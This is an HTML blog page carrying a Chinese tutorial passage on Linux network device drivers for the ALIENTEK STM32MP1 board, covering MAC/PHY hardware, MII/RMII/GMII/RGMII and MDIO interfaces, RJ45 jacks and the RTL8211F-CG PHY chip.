@@ -1,0 +1,1376 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>正点原子嵌入式linux驱动开发——Linux 网络设备驱动 - 编程随想</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="正点原子嵌入式linux驱动开发——Linux 网络设备驱动" />
+<meta property="og:description" content="网络驱动是linux里面驱动三巨头之一，linux下的网络功能非常强大，嵌入式linux中也常常用到网络功能。前面已经讲过了字符设备驱动和块设备驱动，本章就来学习一下linux里面的网络设备驱动。
+嵌入式网络简介 嵌入式下的网络硬件接口 本次笔记中讨论的都是有线网络！
+提起网络，一般想到的硬件就是“网卡”。在电脑领域的“原始社会”，网卡是独立的硬件，如果电脑要上网就得买个网卡插上去，类似现在的显卡一样。但是现在随着技术的不断发展，只需要一个芯片就可以实现有线网卡功能，因此网卡芯片都直接放到了主板上。
+首先，嵌入式网络硬件分为两部分：MAC和PHY，都是通过看数据手册来判断一款SoC是否支持网络，如果一款芯片数据手册说自己支持网络，一般都是说的这款SoC内置MAC，MAC类似I2C控制器、SPI控制器一样的外设。但是光有MAC还不能直接驱动网络，还需要另外一个芯片：PHY，因此对于内置MAC的SoC，其外部必须搭配一个PHY芯片。但是有些SoC内部没有MAC，那也没法搭配PHY芯片了，这些内部没有MAC的芯片上网就要采用另外的嵌入式网络硬件方案。
+SoC内部没有网络MAC外设 一般说某个SoC不支持网络，说的就是它没有网络MAC。可以找个外置的MAC芯片，一般这种外置的网络芯片都是MAC&#43;PHY一体的。比如三星linux开发板里面用的最多的DM9000，因为三星的芯片基本没有内部MAC(比如S3C2440S5PV210，4412 等)，所以三星的开发板都是通过外置的DM9000来完成有线网络功能的，DM9000对SoC 提供了一个SRAM接口，SoC会以SRAM的方式操作DM9000。
+有些外置的网络芯片更强大，内部甚至集成了硬件TCP/IP协议栈，对外提供一个SPI接口，比如W5500。这个一般用于单片机领域，单片机通过SPI接口与W5500进行通信，由于W5500内置了硬件TCP/IP协议栈，因此单片机就不需要移植负责的软件协议栈，直接通过SPI来操作W5500，简化了单片机联网方案。
+这种方案的优点就是让不支持网络的SoC能够另辟蹊径，实现网络功能，但是缺点就是网络效率不高，因为一般芯片内置的MAC会有网络加速引擎，比如网络专用DMA，网络处理效率会很高。而且此类芯片网速都不快，基本就是10/100M。另外，相比PHY芯片而言，此类芯片的成本也比较高，可选择比较少。
+SoC与外部MAC&#43;PHY芯片的连接如下图所示：
+SoC内部集成网络MAC外设 一般说某个SoC支持网络，说的就是他内部集成网络MAC外设，此时还需要外接一个网络PHY芯片。目前将PHY也集成到芯片里面的SoC很少见。一般常见的通用SoC都会集成网络MAC外设，比如STM32F4/F7/H7系列、NXP的I.MX系列以及STM32MP1系列，内部集成网络MAC的优点如下：
+内部MAC外设会有专用的加速模块，比如专用的DMA，加速网速数据的处理。网速快，可以支持10/100/1000M网速。外接PHY可选择性多，成本低。 内部的MAC外设会通过相应的接口来连接外部PHY芯片，根据数据传输模式不同，大致
+可以分为以下两类：
+MII/RMII 接口：支持10Mbit/s和100Mbit/s数据传输模式；GMII/RGMII接口：支持10Mbit/s、100Mbit/s 以及1000Mbit/s数据传输模式。 从这里可以知道，MII/RMII接口最大传输速率为100Mbit/s，而GMII/RGMII接口最大传输速率可达1000Mbit/s；所以一般把MII/RMII称为百兆以太网接口，而把GMII/RGMII称为千兆以太网接口。
+关于这两组接口更加详细的内容会在后面给大家进行介绍，MII/RMII或GMII/RGMII接口是用来传输网络数据的，另外主控SoC需要配置或读取PHY芯片，也就是读写PHY的内部寄存器，所以还需要一个控制接口，叫做MIDO，MDIO很类似IIC，也是两根线，一根数据线叫做MDIO，一根时钟线叫做MDC。
+SoC内部MAC外设与外部PHY芯片的连接如下图所示：
+STM32MP1就有一颗10M/100M/1000M的网络MAC外设，正点原子STM32MP1开发板板载了一颗PHY芯片，V1.2版本及其以前的核心板使用RTL8211F-CG这颗PHY芯片， V1.3版本及其以后核心板使用YT8511C/H这颗PHY芯片。
+因此，这里只讲解SoC内部MAC&#43;外置PHY芯片这种方案。
+MII/RMII、GMII\RGMII接口 MII接口 MII全称是Media Independent Interface，直译过来就是介质独立接口，它是IEEE-802.3定义的以太网标准接口，MII接口用于以太网MAC连接PHY芯片，连接示意图如下图所示：
+MII接口一共有16根信号线，含义如下：
+TX_CLK：发送时钟，如果网速为100M的话时钟频率为25MHz，10M网速的话时钟频率为2.5MHz，此时钟由PHY产生并发送给MAC。TX_EN：发送使能信号。TX_ER：发送错误信号，高电平有效，表示TX_ER有效期内传输的数据无效。10Mpbs网速下TX_ER不起作用。TXD[3:0]：发送数据信号线，一共4根。RXD[3:0]：接收数据信号线，一共4根。RX_CLK：接收时钟信号，如果网速为100M的话时钟频率为25MHz，10M网速的话时钟频率为2.5MHz，RX_CLK也是由PHY产生的。RX_ER：接收错误信号，高电平有效，表示RX_ER有效期内传输的数据无效。10Mpbs网速下RX_ER不起作用。RX_DV：接收数据有效，作用类似TX_EN。CRS：载波侦听信号。COL：冲突检测信号。 MII接口的缺点就是所需信号线太多，这还没有算MDIO和MDC这两根管理接口的数据线，因此MII接口使用已经越来越少了。
+RMII接口 RMII全称是Reduced Media Independent Interface，翻译过来就是精简的介质独立接口，也就是MII接口的精简版本。RMII接口只需要7根数据线，相比MII直接减少了9根，极大的方便了板子布线，RMII接口连接PHY芯片的示意图如下图所示：
+TX_EN：发送使能信号。TXD[1:0]：发送数据信号线，一共2根。RXD[1:0]：接收数据信号线，一共2根。CRS_DV：相当于MII接口中的RX_DV和CRS这两个信号的混合。REF_CLK：参考时钟，由外部时钟源提供，频率为50MHz。这里与MII不同，MII的接收和发送时钟是独立分开的，而且都是由PHY芯片提供的。 GMII接口 GMII(Gigabit Media Independant Interface)，千兆MII接口。GMII采用8位接口数据，工作时钟125MHz，因此传输速率可达1000Mbps；同时兼容MII所规定的10/100Mbps工作方式。GMII接口数据结构符合IEEE以太网标准，该接口定义见IEEE 802.3-2000。信号定义如下：
+GTX_CLK：1000M工作模式下的发送时钟(25MHz)。TX_EN：发送使能信号。TX_ER：发送错误信号，高电平有效，表示TX_ER有效期内传输的数据无效。TXD[7:0]：发送数据信号线，一共8根。RXD[7:0]：接收数据信号线，一共8根。RX_CLK：接收时钟信号。RX_ER：接收错误信号，高电平有效，表示RX_ER有效期内传输的数据无效。RX_DV：接收数据有效，作用类似TX_EN。CRS：载波侦听信号。COL：冲突检测信号。 与MII接口相比，GMII的数据宽度由4位变为8位，GMII接口中的控制信号如TX_ER、TX_EN、RX_ER、RX_DV、CRS和COL的作用同MII接口中的一样，发送参考时钟GTX_CLK和接收参考时钟RX_CLK的频率均为125MHz(在1000Mbps工作模式下)。
+在实际应用中，绝大多数GMII接口都是兼容MII接口的，所以，一般的GMII接口都有两个发送参考时钟：TX_CLK和GTX_CLK(两者的方向是不一样的，前面已经说过了)，在用作MII模式时，使用TX_CLK和8根数据线中的4根。
+RGMII接口 RGMII(Reduced Gigabit Media Independant Interface)，精简版GMII接口。将接口信号线数量从24根减少到14根(COL/CRS 端口状态指示信号，这里没有画出)，时钟频率仍旧为125MHz，TX/RX数据宽度从8为变为4位，为了保持1000Mbps的传输速率不变，RGMII接口在时钟的上升沿和下降沿都采样数据，在参考时钟的上升沿发送GMII接口中的TXD[3:0]/RXD[3:0]，在参考时钟的下降沿发送GMII接口中的TXD[7:4]/RXD[7:4]。RGMII同时也兼容100Mbps 和10Mbps两种速率，此时参考时钟速率分别为25MHz和2.5MHz。
+TX_EN信号线上传送TX_EN 和TX_ER两种信息，在TX_CLK的上升沿发送TX_EN，下降沿发送TX_ER；同样的，RX_DV信号线上也传送RX_DV和RX_ER两种信息，在RX_CLK的上升沿发送RX_DV，下降沿发送RX_ER。
+RGMII接口定义如下所示：
+关于这些接口定义相关的内容就讲到这里，除了上面说到4 种接口以外，还有其他接口，比如SMII、SSMII和SGMII等，关于其他接口基本都是大同小异的，这里就不做讲解了。正点原子STM32MP1开发板上的网口是采用RGMII接口来连接MAC与外部PHY芯片。
+MDIO接口 MDIO全称是Management Data Input/Output，直译过来就是管理数据输入输出接口，是一个简单的两线串行接口，一根MDIO数据线，一根MDC时钟线。驱动程序可以通过MDIO和MDC这两根线访问PHY芯片的任意一个寄存器。MDIO接口支持多达32个PHY。同一时刻内只能对一个PHY进行操作。和IIC一样，使用器件地址即可区分PHY芯片。同一MDIO接口下的所有PHY芯片，其器件地址不能冲突，必须保证唯一，具体器件地址值要查阅相应的PHY数据手册。
+因此，MAC和外部PHY芯片进行连接的时候主要是MII/RMII(百兆网)或GMII/RGMII(千兆网)和MDIO接口，另外可能还需要复位、中断等其他引脚。
+RJ45接口 网络设备是通过网线连接起来的，插入网线的叫做RJ45座，如下图所示：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/eb1842ac6f71ef53db27588c84c28951/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-05T19:38:12+08:00" />
+<meta property="article:modified_time" content="2023-11-05T19:38:12+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程随想" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程随想</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">正点原子嵌入式linux驱动开发——Linux 网络设备驱动</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p><strong>网络驱动是linux里面驱动三巨头之一</strong>，linux下的网络功能非常强大，嵌入式linux中也常常用到网络功能。前面已经讲过了字符设备驱动和块设备驱动，本章就来学习一下linux里面的<strong>网络设备驱动</strong>。</p> 
+<h2><a id="_1"></a>嵌入式网络简介</h2> 
+<h3><a id="_2"></a>嵌入式下的网络硬件接口</h3> 
+<p><strong><font color="Red">本次笔记中讨论的都是有线网络！</font></strong></p> 
+<p>提起网络，一般想到的硬件就是“网卡”。在电脑领域的“原始社会”，网卡是独立的硬件，如果电脑要上网就得买个网卡插上去，类似现在的显卡一样。但是<strong>现在随着技术的不断发展，只需要一个芯片就可以实现有线网卡功能，因此网卡芯片都直接放到了主板上</strong>。</p> 
+<p>首先，<strong>嵌入式网络硬件分为两部分：MAC和PHY</strong>，都是通过看数据手册来判断一款SoC是否支持网络，如果一款芯片数据手册说自己<strong>支持网络，一般都是说的这款SoC内置MAC，MAC类似I2C控制器、SPI控制器一样的外设</strong>。但是光有MAC还不能直接驱动网络，还需要另外一个芯片：PHY，因此<strong>对于内置MAC的SoC，其外部必须搭配一个PHY芯片</strong>。但是有些SoC内部没有MAC，那也没法搭配PHY芯片了，这些内部没有MAC的芯片上网就要采用另外的嵌入式网络硬件方案。</p> 
+<h4><a id="SoCMAC_8"></a>SoC内部没有网络MAC外设</h4> 
+<p>一般说某个SoC不支持网络，说的就是它没有网络MAC。<strong>可以找个外置的MAC芯片，一般这种外置的网络芯片都是MAC+PHY一体的</strong>。比如三星linux开发板里面用的最多的DM9000，因为三星的芯片基本没有内部MAC(比如S3C2440S5PV210，4412 等)，所以三星的开发板都是通过外置的DM9000来完成有线网络功能的，DM9000对SoC 提供了一个SRAM接口，SoC会以SRAM的方式操作DM9000。</p> 
+<p>有些外置的网络芯片更强大，<strong>内部甚至集成了硬件TCP/IP协议栈，对外提供一个SPI接口，比如W5500</strong>。这个一般用于单片机领域，单片机通过SPI接口与W5500进行通信，由于W5500内置了硬件TCP/IP协议栈，因此单片机就不需要移植负责的软件协议栈，直接通过SPI来操作W5500，简化了单片机联网方案。</p> 
+<p>这种方案的<strong>优点就是让不支持网络的SoC能够另辟蹊径，实现网络功能</strong>，但是<strong>缺点就是网络效率不高，因为一般芯片内置的MAC会有网络加速引擎，比如网络专用DMA，网络处理效率会很高</strong>。而且此类芯片网速都不快，基本就是10/100M。另外，相比PHY芯片而言，此类芯片的<strong>成本也比较高</strong>，可选择比较少。</p> 
+<p>SoC与外部MAC+PHY芯片的连接如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/5c/e4/4wuLShQr_o.png" alt="主控SoC与外置MAC+PHY芯片连接"></p> 
+<h4><a id="SoCMAC_19"></a>SoC内部集成网络MAC外设</h4> 
+<p>一般说某个SoC支持网络，说的就是他内部集成网络MAC外设，此时<strong>还需要外接一个网络PHY芯片</strong>。目前将PHY也集成到芯片里面的SoC很少见。一般常见的通用SoC都会集成网络MAC外设，比如STM32F4/F7/H7系列、NXP的I.MX系列以及STM32MP1系列，内部集成网络MAC的优点如下：</p> 
+<ol><li>内部MAC外设会有专用的加速模块，比如专用的DMA，加速网速数据的处理。</li><li>网速快，可以支持10/100/1000M网速。</li><li>外接PHY可选择性多，成本低。</li></ol> 
+<p>内部的MAC外设会通过相应的接口来连接外部PHY芯片，<strong>根据数据传输模式不同，大致<br> 可以分为以下两类</strong>：</p> 
+<ol><li>MII/RMII 接口：支持10Mbit/s和100Mbit/s数据传输模式；</li><li>GMII/RGMII接口：支持10Mbit/s、100Mbit/s 以及1000Mbit/s数据传输模式。</li></ol> 
+<p>从这里可以知道，<strong>MII/RMII接口最大传输速率为100Mbit/s，而GMII/RGMII接口最大传输速率可达1000Mbit/s</strong>；所以一般把MII/RMII称为百兆以太网接口，而把GMII/RGMII称为千兆以太网接口。</p> 
+<p>关于这两组接口更加详细的内容会在后面给大家进行介绍，MII/RMII或GMII/RGMII接口是用来传输网络数据的，另外<strong>主控SoC需要配置或读取PHY芯片，也就是读写PHY的内部寄存器</strong>，所以还需要一个<strong>控制接口，叫做MIDO，MDIO很类似IIC，也是两根线，一根数据线叫做MDIO，一根时钟线叫做MDC</strong>。</p> 
+<p>SoC内部MAC外设与外部PHY芯片的连接如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/1b/3d/7m7j98pq_o.png" alt="内部MAC与外部PHY之间连接(千兆以太网)"></p> 
+<p><img src="https://images2.imgbox.com/72/15/d9j7SucC_o.png" alt="内部MAC与外部PHY之间连接(百兆以太网)"></p> 
+<p><strong>STM32MP1就有一颗10M/100M/1000M的网络MAC外设</strong>，正点原子STM32MP1开发板板载了一颗PHY芯片，V1.2版本及其以前的核心板使用RTL8211F-CG这颗PHY芯片， <strong>V1.3版本及其以后核心板使用YT8511C/H这颗PHY芯片</strong>。</p> 
+<p>因此，这里<strong>只讲解SoC内部MAC+外置PHY芯片这种方案</strong>。</p> 
+<h3><a id="MIIRMIIGMIIRGMII_46"></a>MII/RMII、GMII\RGMII接口</h3> 
+<h4><a id="MII_47"></a>MII接口</h4> 
+<p>MII全称是Media Independent Interface，直译过来就是介质独立接口，它是IEEE-802.3定义的以太网标准接口，MII接口用于以太网MAC连接PHY芯片，连接示意图如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/a7/19/vIbqzgqr_o.png" alt="MII接口"></p> 
+<p>MII接口一共有16根信号线，含义如下：</p> 
+<ul><li>TX_CLK：发送时钟，如果网速为100M的话时钟频率为25MHz，10M网速的话时钟频率为2.5MHz，此时钟由PHY产生并发送给MAC。</li><li>TX_EN：发送使能信号。</li><li>TX_ER：发送错误信号，高电平有效，表示TX_ER有效期内传输的数据无效。10Mpbs网速下TX_ER不起作用。</li><li>TXD[3:0]：发送数据信号线，一共4根。</li><li>RXD[3:0]：接收数据信号线，一共4根。</li><li>RX_CLK：接收时钟信号，如果网速为100M的话时钟频率为25MHz，10M网速的话时钟频率为2.5MHz，RX_CLK也是由PHY产生的。</li><li>RX_ER：接收错误信号，高电平有效，表示RX_ER有效期内传输的数据无效。10Mpbs网速下RX_ER不起作用。</li><li>RX_DV：接收数据有效，作用类似TX_EN。</li><li>CRS：载波侦听信号。</li><li>COL：冲突检测信号。</li></ul> 
+<p>MII接口的缺点就是<strong>所需信号线太多</strong>，这还没有算MDIO和MDC这两根管理接口的数据线，因此MII接口使用已经越来越少了。</p> 
+<h4><a id="RMII_65"></a>RMII接口</h4> 
+<p>RMII全称是Reduced Media Independent Interface，翻译过来就是精简的介质独立接口，也<strong>就是MII接口的精简版本</strong>。RMII接口<strong>只需要7根数据线，相比MII直接减少了9根</strong>，极大的方便了板子布线，RMII接口连接PHY芯片的示意图如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/cf/89/USEDpbte_o.png" alt="RMII接口"></p> 
+<ul><li>TX_EN：发送使能信号。</li><li>TXD[1:0]：发送数据信号线，一共2根。</li><li>RXD[1:0]：接收数据信号线，一共2根。</li><li>CRS_DV：相当于MII接口中的RX_DV和CRS这两个信号的混合。</li><li>REF_CLK：参考时钟，由外部时钟源提供，频率为50MHz。这里与MII不同，MII的接收和发送时钟是独立分开的，而且都是由PHY芯片提供的。</li></ul> 
+<h4><a id="GMII_75"></a>GMII接口</h4> 
+<p>GMII(Gigabit Media Independant Interface)，<strong>千兆MII接口</strong>。<strong>GMII采用8位接口数据，工作时钟125MHz</strong>，因此传输速率可达1000Mbps；同时<strong>兼容MII所规定的10/100Mbps工作方式</strong>。GMII接口数据结构符合IEEE以太网标准，该接口定义见IEEE 802.3-2000。信号定义如下：</p> 
+<p><img src="https://images2.imgbox.com/5c/eb/O6ti2HqQ_o.png" alt="GMII接口"></p> 
+<ul><li>GTX_CLK：1000M工作模式下的发送时钟(25MHz)。</li><li>TX_EN：发送使能信号。</li><li>TX_ER：发送错误信号，高电平有效，表示TX_ER有效期内传输的数据无效。</li><li>TXD[7:0]：发送数据信号线，一共8根。</li><li>RXD[7:0]：接收数据信号线，一共8根。</li><li>RX_CLK：接收时钟信号。</li><li>RX_ER：接收错误信号，高电平有效，表示RX_ER有效期内传输的数据无效。</li><li>RX_DV：接收数据有效，作用类似TX_EN。</li><li>CRS：载波侦听信号。</li><li>COL：冲突检测信号。</li></ul> 
+<p>与MII接口相比，<strong>GMII的数据宽度由4位变为8位</strong>，GMII接口中的控制信号如TX_ER、TX_EN、RX_ER、RX_DV、CRS和COL的作用同MII接口中的一样，发送参考时钟GTX_CLK和接收参考时钟RX_CLK的频率均为125MHz(在1000Mbps工作模式下)。</p> 
+<p>在实际应用中，绝大多数GMII接口都是兼容MII接口的，所以，一般的GMII接口都有两个发送参考时钟：TX_CLK和GTX_CLK(两者的方向是不一样的，前面已经说过了)，在用作MII模式时，使用TX_CLK和8根数据线中的4根。</p> 
+<h4><a id="RGMII_94"></a>RGMII接口</h4> 
+<p>RGMII(Reduced Gigabit Media Independant Interface)，精简版GMII接口。将<strong>接口信号线数量从24根减少到14根(COL/CRS 端口状态指示信号，这里没有画出)，时钟频率仍旧为125MHz，TX/RX数据宽度从8为变为4位</strong>，为了保持1000Mbps的传输速率不变，<strong>RGMII接口在时钟的上升沿和下降沿都采样数据，在参考时钟的上升沿发送GMII接口中的TXD[3:0]/RXD[3:0]，在参考时钟的下降沿发送GMII接口中的TXD[7:4]/RXD[7:4]</strong>。RGMII同时也兼容100Mbps 和10Mbps两种速率，此时参考时钟速率分别为25MHz和2.5MHz。</p> 
+<p>TX_EN信号线上传送TX_EN 和TX_ER两种信息，在TX_CLK的上升沿发送TX_EN，下降沿发送TX_ER；同样的，RX_DV信号线上也传送RX_DV和RX_ER两种信息，在RX_CLK的上升沿发送RX_DV，下降沿发送RX_ER。</p> 
+<p>RGMII接口定义如下所示：</p> 
+<p><img src="https://images2.imgbox.com/7d/40/BS0xwWUZ_o.png" alt="RGMII接口"></p> 
+<p>关于这些接口定义相关的内容就讲到这里，除了上面说到4 种接口以外，还有其他接口，比如SMII、SSMII和SGMII等，关于其他接口基本都是大同小异的，这里就不做讲解了。<strong>正点原子STM32MP1开发板上的网口是采用RGMII接口来连接MAC与外部PHY芯片</strong>。</p> 
+<h3><a id="MDIO_104"></a>MDIO接口</h3> 
+<p>MDIO全称是Management Data Input/Output，直译过来就是管理数据输入输出接口，是<strong>一个简单的两线串行接口，一根MDIO数据线，一根MDC时钟线</strong>。驱动程序可以<strong>通过MDIO和MDC这两根线访问PHY芯片的任意一个寄存器</strong>。MDIO接口支持多达32个PHY。<strong>同一时刻内只能对一个PHY进行操作</strong>。和IIC一样，使用器件地址即可区分PHY芯片。<strong>同一MDIO接口下的所有PHY芯片，其器件地址不能冲突，必须保证唯一</strong>，具体器件地址值要查阅相应的PHY数据手册。</p> 
+<p>因此，<strong>MAC和外部PHY芯片进行连接的时候主要是MII/RMII(百兆网)或GMII/RGMII(千兆网)和MDIO接口</strong>，另外可能还需要复位、中断等其他引脚。</p> 
+<h3><a id="RJ45_108"></a>RJ45接口</h3> 
+<p>网络设备是通过网线连接起来的，插入网线的叫做RJ45座，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/3c/6c/uJLID9GE_o.png" alt="RJ45座子"></p> 
+<p><strong>RJ45座要与PHY芯片连接在一起，但是中间需要一个网络变压器，网络编译器用于隔离以及滤波等</strong>，网络变压器也<strong>是一个芯片</strong>，外形一般如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/ae/f3/JN2JT9j8_o.png" alt="网络变压器"></p> 
+<p>但是现在<strong>很多RJ45座子内部已经集成了网络变压器，比如正点原子的STM32MP1开发板所使用的ATK911130A就是内置网络变压器的RJ45座</strong>。内置网络变压器的RJ45座和不内置的引脚一样，但是一般不内置的RJ45座会短一点。因此，在画板的时候一定要考虑所使用的RJ45座是否内置网络变压器，如果不内置的话就要自行添加网络变压器部分电路！同理，如果设计的硬件是需要内置网络变压器的RJ45座，肯定不能随便焊接一个不内置变压器的RJ45座，否则网络工作不正常！</p> 
+<p>RJ45座子上一般有两个灯，一个黄色(橙色)，一个绿色，一般绿色亮的话表示网络连接正常，黄色闪烁的话说明当前正在进行网络通信，当然了有时候两个灯的状态会反过来，以实际为准。这两个灯由PHY芯片控制，<strong>对于千M网络PHY芯片，一般PHY芯片会有3个LED灯引脚，多了一个千M网络状态指示灯</strong>。<strong>PHY芯片会通过这几个LED灯引脚来连接RJ45座上的这两个灯</strong>(千M PHY会有3个LED灯引脚，一般硬件设计人员会自行选择将其中的哪两个连接到RJ45座上)。由于正点原子STM32MP157开发板采用的千M网络PHY，所以后面只讲千M网络。<strong>内部MAC+外部PHY+RJ45座(内置网络变压器)就组成了一个完整的嵌入式网络接口硬件</strong>，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/c0/91/NTjopJdl_o.png" alt="嵌入式网络硬件接口示意图"></p> 
+<h3><a id="STM32MP1_GMAC_123"></a>STM32MP1 GMAC接口简介</h3> 
+<p><strong>STM32MP1内核集成了一个10M/100M/1000M的网络MAC</strong>，符合IEEE802.3-2002标准，<strong>MAC层支持双工或者半双工模式下运行</strong>。MAC可编程，<strong>有直接存储器接口的专用DMA</strong>，介质访问控制器(MAC)和<strong>支持多种格式的PHY接口模块</strong>。</p> 
+<p>STM32MP1内部ENET外设主要特性如下：</p> 
+<ol><li>、支持全工和半双工操作。</li><li>全双工流控制操作(IEEE 802.3X暂停包和优先级流控制)。</li><li>报头和帧起始数据(SFD)在发送模式下自动插入、在接收中自动删除。</li><li>可逐帧控制CRC和pad自动生成。</li><li>可编程数据包长度，支持标准以太网数据包或高达16KB的巨型以太网数据包。</li><li>可编程数据包间隙。</li><li>两组 FIFO：一个具有可编程阈值功能的4096字节发送FIFO和一个具有可配置阈值功能的4096字节接收FIFO。</li><li>……</li></ol> 
+<p>STM32MP1的GMAC外设内容比较多，详细的介绍请查阅《STM32MP1 参考手册》的“Ethernet (ETH): Gigabit media access control(GMAC) with DMA controller”章节。在编写驱动的时候<strong>其实并不需要关注GMAC控制器外设的具体内容</strong>，因为这部分驱动是<strong>SoC厂商写的</strong>，<strong>重点关注的是更换PHY芯片以后哪里需要调整</strong>。</p> 
+<h2><a id="PHY_138"></a>PHY芯片详解</h2> 
+<h3><a id="PHY_139"></a>PHY基础知识简介</h3> 
+<p>PHY是IEEE 802.3规定的一个标准模块，前面说了，SoC可以对PHY进行配置或者读取PHY相关状态，这个就需要PHY内部寄存器去实现了。<strong>PHY 芯片寄存器地址空间为5位，地址0-31共32个寄存器，IEEE定义了0-15这16个寄存器的功能，16-31这16个寄存器由厂商自行实现</strong>。也就是说不管用的哪个厂家的PHY芯片，<strong>其中0-15这16个寄存器是一模一样的</strong>。仅靠这16个寄存器是完全可以驱动起PHY芯片的，至少能保证基本的网络数据通信，因此<strong>Linux内核有通用PHY驱动</strong>。在实际开发中可能会遇到一些其他的问题导致Linux内核的通用PHY驱动工作不正常，这个时候就需要驱动开发人员去调试了。但是，随着现在的PHY芯片性能越来越强大，32个寄存器可能满足不了厂商的需求，因此<strong>很多厂商采用分页技术来扩展寄存器地址空间，以求定义更多的寄存器</strong>。这些多出来的寄存器可以用于实现厂商特有的一些技术，因此Linux内核的通用PHY驱动就无法驱动这些特色<br> 功能了，这个时候就<strong>需要PHY厂商提供相应的驱动源码</strong>了，所以也会<strong>在Linux内核里面看到很多具体的PHY芯片驱动源码</strong>。不管PHY芯片有多少特色功能，按道理来讲，<strong>Linux内核的通用PHY驱动是绝对可以让这PHY芯片实现基本的网络通信</strong>，因此也不用担心更换PHY芯片以后网络驱动编写是不是会很复杂。</p> 
+<p>IEEE802.3协议英文原版已经放到了开发板光盘中，其中有对PHY的前16个寄存器功能进行了规定，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/e5/a3/MbizLoqv_o.png" alt="IEEE规定的前16个寄存器"></p> 
+<p>关于这16个寄存器的内容协议里面也进行了详细的讲解，这里就不分析了。后面会<strong>以正点原子STM32MP1开发板所使用的RTL8211F-CG(YT8511C/H)这个PHY为例，详细的分析一下PHY芯片的寄存器</strong>。</p> 
+<h3><a id="RTL8211FCG_148"></a>RTL8211F-CG详解</h3> 
+<p>此小节是针对核心板为V1.2版本的PHY讲解RTL8211F-CG这颗PHY芯片是由realtek公司出品的。</p> 
+<p>本小节以RTL8211F-CG为例做一个简单第介绍，<strong>虽然讲解的是RTL8211F-CG这颗PHY，但是前面说了，IEEE规定了PHY的前16个寄存器的功能，因此如果所使用的板子用的其它厂家的PHY芯片，也是可以看本小节的</strong>。</p> 
+<h4><a id="RTL8211FCG_152"></a>RTL8211F-CG简介</h4> 
+<p>Realtek RTL8211F-CG是高度集成的以太网收发器，符合10Base-T、100Base-TX和1000Base-T IEEE 802.3标准。它提供了所有通过CAT.5 UTP电缆收发以太网数据包所需的必要物理层功能。</p> 
+<p>RTL8211F使用最新的DSP技术和模拟前端(AFE)，可以<strong>通过UTP电缆进行高速数据传输和接收</strong>。RTL8211F中<strong>实现了交叉检测和自动校正、极性校正、自适应均衡、串扰消除、回声消除、定时恢复和错误校正等功能，以提供10Mbps100Mbps或1000Mbps的强大收发功能</strong>。</p> 
+<p>MAC和PHY之间的数据传输是<strong>通过RGMII接口进行的，RTL8211E支持RGMII的1.5V信号</strong>。</p> 
+<p>RTL8211E的主要特点如下：</p> 
+<ul><li>兼容1000Base-T IEEE 802.3ab标准。</li><li>兼容100Base-TX IEEE 802.3u标准。</li><li>兼容10Base-T IEEE 802.3标准。</li><li>支持GMII、RGMII接口。</li><li>支持IEEE 802.3az-2010(节能以太网)。</li><li>内置LAN唤醒(WOL)。</li><li>支持中断、并行检测、交叉检测、自动校正、自动极性校正。</li><li>支持120m的1000Base-T的CAT.5类电缆。</li><li>支持RGMII的1.5V信号。</li><li>……</li></ul> 
+<p>RTL8211F千兆PHY的系统应用场景如下：</p> 
+<ul><li>数字电视(DTV)。</li><li>媒体访问单元(MAU)。</li><li>通讯和网络提升板(CNR)。</li><li>游戏机。</li><li>打印机和办公机器。</li><li>DVD播放机和刻录机。</li><li>以太网集线器、交换机。</li></ul> 
+<p>RTL8211F功能框图如下所示：</p> 
+<p><img src="https://images2.imgbox.com/8b/be/0LXGeQut_o.png" alt="RTL8211F-CG详解"></p> 
+<h4><a id="EEE_184"></a>节能以太网(EEE)</h4> 
+<p>RTL8211F支持IEEE 802.3az-2010(也称为节能以太网(EEE))，速率为10Mbps、100Mbps或1000Mbps时它提供了一个协议，可根据链路利用率协调进出较低功耗级别(低功耗空闲模式)的转换，当没有数据包传输时，系统进入低功耗空闲模式以降低功耗，一旦需要发送数据包，系统将返回正常模式，并且无需更改链接状态和丢弃/破坏帧即可进行此操作。</p> 
+<p>为了节省功率，当系统处于低功耗空闲模式时，大多数电路功能都被禁用；但是，低功耗空闲模式的过渡时间保持足够小，以使得对上层协议和应用程序透明。</p> 
+<h4><a id="_188"></a>中断管理</h4> 
+<p>每当RTL8211F检测到<strong>介质状态发生变化时，它就会将中断引脚(INTB)拉低发出中断事件。SoC MAC端会感应到状态更改，并通过MDC/MDIO接口访问相关的寄存器</strong>。</p> 
+<p>一旦MAC通过MDC/MDIO读取了这些状态寄存器，就会将INTB置为无效。所以<strong>不需要通过轮训的方式去反复查询状态寄存器的变化</strong>。</p> 
+<h4><a id="PHY_192"></a>PHY地址设置</h4> 
